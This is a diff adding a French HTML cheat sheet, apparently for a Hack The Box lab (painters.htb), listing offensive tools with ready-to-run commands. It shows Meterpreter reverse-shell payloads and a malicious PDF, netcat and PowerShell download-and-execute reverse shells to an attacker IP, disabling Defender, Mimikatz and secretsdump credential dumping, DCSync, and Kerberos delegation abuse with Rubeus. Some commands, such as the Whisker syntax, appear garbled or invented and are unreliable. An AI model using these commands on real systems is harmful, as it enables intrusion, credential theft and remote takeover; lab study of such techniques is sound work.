@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Zephyr - Tools & Attacks</title>
+  <style>
+    body {
+      margin: 0;
+      display: flex;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #0d1117;
+      color: #ffffff;
+    }
+    .sidebar {
+      width: 260px;
+      background-color: #0d1117;
+      height: 100vh;
+      overflow-y: auto;
+      padding: 1rem;
+      border-right: 1px solid #30363d;
+      position: fixed;
+    }
+    .sidebar h2 {
+      color: #ffffff;
+      font-size: 1rem;
+      margin-bottom: 1rem;
+    }
+    .sidebar ul {
+      list-style: none;
+      padding: 0;
+    }
+    .sidebar ul li {
+      margin-bottom: 0.7rem;
+    }
+    .sidebar ul li a {
+      color: #c9d1d9;
+      text-decoration: none;
+    }
+    .sidebar ul li a:hover {
+      color: #58a6ff;
+    }
+    .main-content {
+      margin-left: 260px;
+      padding: 2rem;
+      width: 100%;
+    }
+    .tool-entry {
+      background: #161b22;
+      border: 1px solid #30363d;
+      padding: 1.2rem;
+      border-radius: 6px;
+      margin-bottom: 2rem;
+    }
+    .tool-entry h3 {
+      margin-top: 0;
+      color: #58a6ff;
+    }
+    .container {
+  margin-left: 260px;
+  padding: 2rem;
+  width: 100%;
+  max-width: 1100px; /* Largeur maximale du contenu */
+  margin-inline: auto; /* Centre horizontalement */
+}
+.header, .tool-section {
+  text-align: center;
+}
+.tool-entry {
+  text-align: left; /* Pour garder le texte à gauche à l'intérieur */
+  
+}
+h1 {
+  color: white;
+  text-shadow: none;
+}
+.banner {
+  text-align: center;
+  margin-bottom: 2rem;
+}
+
+.banner-image {
+  max-width: 100%;
+  height: auto;
+  display: block;
+  margin: 0 auto;
+}
+pre code {
+  display: block;
+  background-color: #0d1117;   /* Fond type terminal */
+  color: #00ff00;              /* Texte vert */
+  font-family: 'Courier New', Courier, monospace;
+  padding: 1rem;
+  border-radius: 8px;
+  margin-top: 1rem;
+  margin-bottom: 1rem;
+  overflow-x: auto;
+  box-shadow: inset 0 0 10px #00ff00;
+  border: 1px solid #00ff00;
+}
+
+
+  </style>
+</head>
+<body>
+    <div class="sidebar">
+        <h2>🔧 Outils</h2>
+        <ul>
+            <li><a href="#metasploit">Metasploit</a></li>
+            <li><a href="#rubeus">Rubeus</a></li>
+            <li><a href="#whisker">Whisker</a></li>
+            <li><a href="#powerview">PowerView</a></li>
+            <li><a href="#powermad">PowerMad</a></li>
+            <li><a href="#impacket">Impacket</a></li>
+            <li><a href="#nmap">Nmap</a></li>
+            <li><a href="#mimikatz">Mimikatz</a></li>
+            <li><a href="#sweetpotato">SweetPotato</a></li>
+            <li><a href="#powerupsql">PowerUpSQL</a></li>
+            <li><a href="#netcat">Netcat</a></li>
+        </ul>
+    </div>
+
+    <div class="container">
+        <!-- Bouton retour vers index.html -->
+        <div style="position: fixed; top: 1rem; left: 320px;">
+            <a href="index.html" style="display: inline-block;">
+                <img src="/retyour_zephyr.png" alt="Retour" style="width: 60px; height: 60px;">
+            </a>
+        </div>
+        <header class="banner">
+            <img src="/4pKBikrxrg0SuJSGGQTykn7DLHzMdcYh.webp"  class="banner-image" alt="Zephyr Banner" />
+            <h1>Zephyr - Tools & Attacks</h1>
+        </header>
+
+        <section class="tool-section">
+            <div class="tool-entry" id="metasploit"> 
+                <div>
+                    <h2>Metasploit</h2>
+                    <p>Utilisé pour générer des reverse shells et exploiter des failles connues à travers divers payloads.</p>
+                    <h3>Exemple : Exploitation via le module <code>fileformat/badpdf</code></h3>
+                    <p>
+                        Ce module génère un fichier PDF malveillant qui, lorsqu’il est ouvert, exécute un payload sur la machine cible.
+                    </p>
+                    <pre><code>
+            use exploit/multi/fileformat/badpdf
+            set payload windows/meterpreter/reverse_tcp
+            set LHOST 10.10.14.24
+            set LPORT 4444
+            exploit
+                    </code></pre>
+                    <p>
+                        Une fois le PDF généré et ouvert par la victime, une session Meterpreter est établie vers l'attaquant.
+                    </p>
+                </div>
+            </div>
+            
+
+            <div class="tool-entry" id="rubeus"> 
+                <div>
+                    <h2>Rubeus</h2>
+                    <p>
+                        Rubeus est un outil post-exploitation puissant permettant la manipulation des tickets Kerberos.
+                        Il est utilisé pour l'extraction de tickets TGT, l'élévation de privilèges via S4U2Self/S4U2Proxy, et la délégation de TGT.
+                    </p>
+            
+                    <h3>🎯 Exemple 1 : Demande de TGT (asktgt)</h3>
+                    <pre><code>.\Rubeus.exe asktgt /user:blake /password:Password123! /domain:painters.htb /outfile:ticket.kirbi</code></pre>
+                    <p>➡️ Ce module demande un TGT en fournissant les identifiants de l’utilisateur.</p>
+            
+                    <h3>🎯 Exemple 2 : S4U2Self + S4U2Proxy</h3>
+                    <pre><code>.\Rubeus.exe s4u /ticket:ticket.kirbi /msdsspn:cifs/dc.painters.htb /impersonateuser:DC$ /domain:painters.htb /altservice:CIFS,HOST,LDAP /ptt</code></pre>
+                    <p>➡️ Ce module permet de s’authentifier en tant qu’un autre utilisateur via S4U2Self puis de faire une requête S4U2Proxy pour déléguer son identité.</p>
+            
+                    <h3>🎯 Exemple 3 : TGT Delegation</h3>
+                    <pre><code>.\Rubeus.exe tgtdeleg</code></pre>
+                    <p>➡️ Ce module demande un TGT avec délégation à l’aide d’un service de confiance configuré pour déléguer.</p>
+            
+                    <!-- 🔗 Lien GitHub -->
+                    <p style="margin-top: 1rem;">
+                        🔗 <a href="https://github.com/jakobfriedl/precompiled-binaries/raw/main/LateralMovement/Rubeus.exe" target="_blank" style="color:#58a6ff; font-weight:bold;">Download Rubeus.exe sur GitHub</a>
+                    </p>
+                </div>
+            </div>
+            
+            
+
+            <div class="tool-entry" id="whisker">
+                <img src="img/whisker.png" alt="Whisker" class="tool-icon">
+                <div>
+                    <h2>Whisker</h2>
+                    <p>Whisker est un outil permettant de générer des certificats malveillants pour exploiter les failles des services ADCS (Active Directory Certificate Services).</p>
+
+                    <h3>🎯 Exemple 1 : Génération d'un certificat malveillant</h3>
+                    <pre><code>whisker req -ca "http://10.10.10.10/certsrv/" -template "Machine" -altname "evil.com"</code></pre>
+                    <p>➡️ Cette commande génère un certificat malveillant en abusant d'un modèle de certificat.</p>
+
+                    <h3>🎯 Exemple 2 : Exploitation de l'authentification NTLM</h3>
+                    <pre><code>whisker relay -target "http://10.10.10.10/certsrv/" -listener "http://attacker.com"</code></pre>
+                    <p>➡️ Cette commande configure un relais NTLM pour capturer les identifiants.</p>
+
+                    <h3>🎯 Exemple 3 : Dump des certificats</h3>
+                    <pre><code>whisker dump -ca "http://10.10.10.10/certsrv/"</code></pre>
+                    <p>➡️ Cette commande extrait les certificats disponibles sur le serveur ADCS.</p>
+                </div>
+            </div>
+
+            <div class="tool-entry" id="powerview">
+                <img src="img/powerview.png" alt="PowerView" class="tool-icon">
+                <div>
+                    <h2>PowerView</h2>
+                    <p>Enumération Active Directory, groupes, membres, et privilèges utilisateurs via PowerShell.</p>
+            
+                    <h3 style="color: #58a6ff;">Exemple : Attaque DCSync avec PowerView</h3>
+                    <p>
+                        Cette attaque permet d'exécuter des commandes sur des machines distantes après avoir obtenu des privilèges adéquats,
+                        typiquement via l'abus d'appartenance à un groupe privilégié comme "Replicator".
+                    </p>
+            
+                    <pre><code>
+            powershell -ep bypass
+            iex (iwr http://10.10.14.15/PowerView.ps1 -UseBasicParsing)
+            
+            $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+            Set-DomainUserPassword -Domain painters.htb -Identity blake -AccountPassword $UserPassword -Verbose
+                    </code></pre>
+            
+                    <p>Création d'un objet d'identification PowerShell :</p>
+                    <pre><code>
+            $user = 'painters\blake'
+            $passwd = 'Password123!'
+            $secpass = ConvertTo-SecureString $passwd -AsPlainText -Force
+            $cred = new-object system.management.automation.PSCredential ($user, $secpass)
+                    </code></pre>
+            
+                    <p>Tentatives d'exécution de commandes sur les serveurs distants :</p>
+                    <pre><code>
+            Invoke-Command -ComputerName DC -ScriptBlock {whoami} -Credential $cred
+            Invoke-Command -ComputerName PNT-SVRBPA -ScriptBlock {whoami} -Credential $cred
+            Invoke-Command -ComputerName PNT-SVRPSB -ScriptBlock {whoami} -Credential $cred
+                    </code></pre>
+            
+                    <p>Transfert de Netcat sur la machine cible :</p>
+                    <pre><code>
+            Invoke-Command -ComputerName PNT-SVRPSB -ScriptBlock {
+                mkdir c:\temp;
+                powershell iwr http://10.10.14.15/nc64.exe -O c:\temp\nc64.exe
+            } -Credential $cred
+                    </code></pre>
+            
+                    <p>Envoi d’un reverse shell vers l’attaquant :</p>
+                    <pre><code>
+            Invoke-Command -ComputerName PNT-SVRPSB -ScriptBlock {
+                c:\temp\nc64.exe 10.10.14.15 443 -e cmd.exe
+            } -Credential $cred
+                    </code></pre>
+                     <!-- 🔗 Lien GitHub -->
+            </div>
+            
+
+            <div class="tool-entry" id="powermad">
+                <img src="img/powermad.png" alt="PowerMad" class="tool-icon">
+                <div>
+                    <h2>PowerMad</h2>
+                    <p>PowerMad est un module PowerShell permettant de créer des comptes machine et de manipuler les ACLs Active Directory pour des attaques de délégation de privilèges.</p>
+
+                    <h3>🎯 Exemple 1 : Création d'un compte machine</h3>
+                    <pre><code>Import-Module .\PowerMad.ps1
+New-MachineAccount -MachineAccount "NewMachine" -Password $(ConvertTo-SecureString "Password123!" -AsPlainText -Force)</code></pre>
+                    <p>➡️ Cette commande crée un compte machine nommé "NewMachine" avec un mot de passe défini.</p>
+
+                    <h3>🎯 Exemple 2 : Ajout de droits de délégation</h3>
+                    <pre><code>Set-ADACL -Principal "NewMachine$" -Rights All</code></pre>
+                    <p>➡️ Cette commande attribue tous les droits au compte machine "NewMachine$".</p>
+
+                    <h3>🎯 Exemple 3 : Suppression d'un compte machine</h3>
+                    <pre><code>Remove-MachineAccount -MachineAccount "NewMachine"</code></pre>
+                    <p>➡️ Cette commande supprime le compte machine "NewMachine".</p>
+                </div>
+            </div>
+
+            <div class="tool-entry" id="impacket">
+                <img src="img/impacket.png" alt="Impacket" class="tool-icon">
+                <div>
+                    <h2>Impacket</h2>
+                    <p>Impacket est une collection de scripts Python permettant d'exploiter divers protocoles réseau comme SMB, RPC, et WinRM pour des attaques post-exploitation.</p>
+
+                    <h3>🎯 Exemple 1 : Exécution de commandes via SMBExec</h3>
+                    <pre><code>python3 smbexec.py DOMAIN/username:password@10.10.10.10</code></pre>
+                    <p>➡️ Cette commande ouvre un shell interactif sur la machine cible en utilisant SMB.</p>
+
+                    <h3>🎯 Exemple 2 : Dump des hashes NTLM avec secretsdump</h3>
+                    <pre><code>python3 secretsdump.py DOMAIN/username:password@10.10.10.10</code></pre>
+                    <p>➡️ Cette commande extrait les hashes NTLM des comptes locaux et de domaine.</p>
+
+                    <h3>🎯 Exemple 3 : Requête Kerberos avec GetUserSPNs</h3>
+                    <pre><code>python3 GetUserSPNs.py DOMAIN/username:password -dc-ip 10.10.10.10</code></pre>
+                    <p>➡️ Cette commande identifie les comptes avec SPN configurés et récupère leurs tickets Kerberos.</p>
+                </div>
+            </div>
+
+            <div class="tool-entry" id="evil-winrm">
+                <img src="img/evilwinrm.png" alt="Evil-WinRM" class="tool-icon">
+                <div>
+                    <h2>Evil-WinRM</h2>
+                    <p>
+                        Evil-WinRM est un shell interactif PowerShell qui permet de prendre le contrôle d'une machine Windows via WinRM.
+                        C’est l’un des outils les plus utilisés pour l'accès distant sur les systèmes Windows lors des tests d’intrusion.
+                    </p>
+            
+                    <h3>🎯 Exemple 1 : Connexion simple avec mot de passe</h3>
+                    <pre><code>evil-winrm -i 10.10.10.100 -u administrator -p 'Password123!'</code></pre>
+                    <p>➡️ Connexion au shell PowerShell distant avec mot de passe clair.</p>
+            
+                    <h3>🎯 Exemple 2 : Connexion avec un certificat</h3>
+                    <pre><code>evil-winrm -i 10.10.10.100 -u administrator -k cert.pem -s key.pem</code></pre>
+                    <p>➡️ Utilisation d’un certificat et clé privée pour s’authentifier sans mot de passe.</p>
+            
+                    <h3>🎯 Exemple 3 : Upload d’un fichier vers la machine cible</h3>
+                    <pre><code>upload shell.exe</code></pre>
+                    <p>➡️ Transfère un fichier local vers la machine distante dans le dossier courant.</p>
+            
+                    <!-- 🔗 Lien GitHub -->
+                    <p style="margin-top: 1rem;">
+                        🔗 <a href="https://github.com/Hackplayers/evil-winrm" target="_blank" style="color:#58a6ff; font-weight:bold;">Evil-WinRM sur GitHub</a>
+                    </p>
+                </div>
+            </div>            
+            <div class="tool-entry" id="meterpreter-shell">
+                <img src="img/metasploit.png" alt="Metasploit" class="tool-icon">
+                <div>
+                    <h2>Metasploit - Session Meterpreter via Evil-WinRM</h2>
+                    <p>
+                        Cet exemple montre comment établir une session <strong>Meterpreter</strong> depuis un shell Evil-WinRM, 
+                        en générant un payload avec msfvenom et en l’exécutant sur la machine cible.
+                    </p>
+            
+                    <h3>🎯 Étape 1 : Génération du payload (machine attaquante)</h3>
+                    <pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=443 -f exe -o shell.exe</code></pre>
+            
+                    <h3>🎯 Étape 2 : Configuration du handler Metasploit</h3>
+                    <pre><code>sudo msfconsole
+            use exploit/multi/handler
+            set payload windows/x64/meterpreter/reverse_tcp
+            set LHOST tun0
+            set LPORT 443
+            run</code></pre>
+            
+                    <h3>🎯 Étape 3 : Exécution sur la machine cible (via Evil-WinRM)</h3>
+                    <pre><code>Set-MpPreference -DisableRealtimeMonitoring $true
+            upload shell.exe
+            .\shell.exe</code></pre>
+            
+                    <p>✅ Si tout est correctement configuré, tu verras une session Meterpreter s’ouvrir dans ta console Metasploit côté attaquant.</p>
+                </div>
+            </div>
+            
+            <div class="tool-entry" id="mimikatz">
+                <img src="img/mimikatz.png" alt="Mimikatz" class="tool-icon">
+                <div>
+                    <h2>Mimikatz</h2>
+                    <p>Mimikatz est un outil puissant pour extraire des informations d'identification, comme les mots de passe en clair, les hashes NTLM, et les tickets Kerberos. Il est souvent utilisé pour des attaques post-exploitation.</p>
+
+                    <h3>🎯 Exemple 1 : Extraction des mots de passe en clair</h3>
+                    <pre><code>privilege::debug
+sekurlsa::logonpasswords</code></pre>
+                    <p>➡️ Cette commande affiche les mots de passe en clair des sessions utilisateur actives.</p>
+
+                    <h3>🎯 Exemple 2 : Extraction des hashes NTLM</h3>
+                    <pre><code>lsadump::sam /sam:system /system:system.hive /security:security.hive</code></pre>
+                    <p>➡️ Cette commande extrait les hashes NTLM des comptes locaux à partir des fichiers SAM et SYSTEM.</p>
+
+                    <h3>🎯 Exemple 3 : Attaque DCSync</h3>
+                    <pre><code>lsadump::dcsync /user:Administrator</code></pre>
+                    <p>➡️ Cette commande récupère les hashes NTLM et les mots de passe Kerberos pour un utilisateur spécifique.</p>
+                </div>
+            </div>
+
+            <div class="tool-entry" id="sweetpotato">
+                <img src="img/sweetpotato.png" alt="SweetPotato" class="tool-icon">
+                <div>
+                    <h2>SweetPotato</h2>
+                    <p>SweetPotato exploite le privilège SeImpersonatePrivilege pour obtenir une élévation de privilèges sur les systèmes Windows.</p>
+
+                    <h3>🎯 Exemple 1 : Exécution d'une commande en tant qu'administrateur</h3>
+                    <pre><code>SweetPotato.exe -c "cmd.exe /c whoami"</code></pre>
+                    <p>➡️ Cette commande exécute "whoami" avec des privilèges élevés, affichant "NT AUTHORITY\SYSTEM".</p>
+
+                    <h3>🎯 Exemple 2 : Lancer un reverse shell</h3>
+                    <pre><code>SweetPotato.exe -c "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.15/shell.ps1')\""</code></pre>
+                    <p>➡️ Cette commande télécharge et exécute un script PowerShell pour établir un reverse shell.</p>
+                </div>
+            </div>
+
+            <div class="tool-entry" id="powerupsql">
+                <img src="img/powerupsql.png" alt="PowerUpSQL" class="tool-icon">
+                <div>
+                    <h2>PowerUpSQL</h2>
+                    <p>PowerUpSQL est un outil d'audit SQL Server qui permet d'identifier les failles de sécurité et d'exploiter les privilèges SQL.</p>
+
+                    <h3>🎯 Exemple 1 : Enumération des bases de données</h3>
+                    <pre><code>Get-SQLInstanceDomain | Get-SQLDatabase</code></pre>
+                    <p>➡️ Cette commande liste toutes les bases de données accessibles sur les instances SQL Server du domaine.</p>
+
+                    <h3>🎯 Exemple 2 : Exécution de commandes via xp_cmdshell</h3>
+                    <pre><code>Invoke-SQLOSCmd -Instance "SQLSERVER01" -Command "whoami"</code></pre>
+                    <p>➡️ Cette commande exécute "whoami" sur le serveur SQL et retourne l'utilisateur exécutant le processus.</p>
+
+                    <h3>🎯 Exemple 3 : Dump des mots de passe</h3>
+                    <pre><code>Get-SQLColumnSampleData -Instance "SQLSERVER01" -Database "master" -Table "users" -Column "password"</code></pre>
+                    <p>➡️ Cette commande extrait des échantillons de données de la colonne "password" dans la table "users".</p>
+                </div>
+            </div>
+
+            <div class="tool-entry" id="netcat">
+                <img src="img/netcat.png" alt="Netcat" class="tool-icon">
+                <div>
+                    <h2>Netcat</h2>
+                    <p>Netcat est un outil polyvalent pour établir des connexions réseau, souvent utilisé pour les reverse shells et les transferts de fichiers.</p>
+
+                    <h3>🎯 Exemple 1 : Écoute sur un port</h3>
+                    <pre><code>nc -lvnp 4444</code></pre>
+                    <p>➡️ Cette commande met Netcat en mode écoute sur le port 4444, prêt à recevoir une connexion.</p>
+
+                    <h3>🎯 Exemple 2 : Envoi d'un reverse shell</h3>
+                    <pre><code>nc 10.10.14.15 4444 -e /bin/bash</code></pre>
+                    <p>➡️ Cette commande envoie un shell bash à l'adresse IP et au port spécifiés.</p>
+
+                    <h3>🎯 Exemple 3 : Transfert de fichiers</h3>
+                    <pre><code># Machine recevant le fichier
+nc -l -p 1234 > received_file.txt
+
+# Machine envoyant le fichier
+nc 10.10.14.15 1234 < file_to_send.txt</code></pre>
+                    <p>➡️ Ces commandes transfèrent "file_to_send.txt" d'une machine à une autre.</p>
+                </div>
+            </div>
+        </section>
+    </div>
+</body>
+</html>
